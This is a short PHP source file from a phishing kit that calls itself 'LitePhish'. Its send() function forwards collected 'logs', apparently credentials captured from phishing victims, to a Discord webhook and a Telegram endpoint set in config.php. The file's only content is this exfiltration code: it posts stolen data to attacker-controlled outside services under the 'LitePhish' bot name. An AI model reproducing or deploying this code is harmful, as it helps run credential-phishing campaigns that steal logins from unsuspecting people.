<?php
include("config.php");

function send($logs)
{
	discord($logs);
	telegram($logs);
}

function telegram($logs)
{
	global $telegram;
    if(!$telegram) return;
    $data = array(
    'text' => $logs
    );
    
    // use key 'http' even if you send the request to https://...
    $options = array(
        'http' => array(
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        )
    );
    file_get_contents($telegram, false, stream_context_create($options));
}

function discord($logs)
{
	global $discord;
    if(!$discord) return;
    $data = array(
    'username' => 'LitePhish', 
    'avatar_url' => 'https://raw.githubusercontent.com/DarkSecDevelopers/LitePhish/main/logo.png',
    'content' => $logs
    );
    
    // use key 'http' even if you send the request to https://...
    $options = array(
        'http' => array(
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        )
    );
    file_get_contents($discord, false, stream_context_create($options));
}
?>